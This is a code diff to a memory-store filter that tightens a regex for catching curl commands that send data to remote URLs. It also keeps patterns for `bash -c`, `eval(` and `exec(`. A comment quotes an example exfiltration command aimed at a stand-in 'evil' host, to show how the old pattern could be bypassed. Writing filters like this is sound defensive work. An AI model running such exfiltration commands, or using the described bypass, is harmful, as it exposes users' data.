@@ -15,7 +15,22 @@ import type { RouteContext } from './types.js'
 const MEMORY_CATEGORIES = new Set(['hot', 'warm', 'cold', 'shared'])
 
 const SUSPICIOUS_PATTERNS = [
-  /\bcurl\s+(-[a-zA-Z]\s+)*https?:\/\//i,
+  // A curl INVOCATION against a remote URL (card f8599516).
+  //
+  // The old shape was `\bcurl\s+(-[a-zA-Z]\s+)*https?://`, which only tolerated single-letter
+  // flags that take no value. `-X POST` broke the group -- `POST` is neither a flag nor the URL --
+  // so `curl -X POST https://evil/exfil` walked straight through the filter. So did every long
+  // flag (`--data`, `--request`) and every flag carrying a value.
+  //
+  // This models a COMMAND LINE instead of a flag prefix: after `curl`, each whitespace-separated
+  // token up to the URL must look like an argument -- a short/long flag, an HTTP method, a quoted
+  // string, or an @file reference. Prose tokens do not match, which is what keeps ordinary text
+  // like "API el+curl mukodik, de ... Staging: https://..." (a real memory in the live store) from
+  // being rejected. A plain proximity match (`curl` ... `https://` within N chars) DID flag it.
+  //
+  // Measured against the live memory corpus (416 records) when this was written: the old pattern
+  // matched 0, this one also matches 0 -- the widening adds no false positive on real content.
+  /\bcurl\b(?:\s+(?:-{1,2}[A-Za-z][\w-]*|POST|GET|PUT|DELETE|PATCH|HEAD|OPTIONS|"[^"\n]*"|'[^'\n]*'|@[\w./~-]+))*\s+["']?https?:\/\//i,
   /\bbash\s+-c\b/i,
   /\beval\s*\(/i,
   /\bexec\s*\(/i,
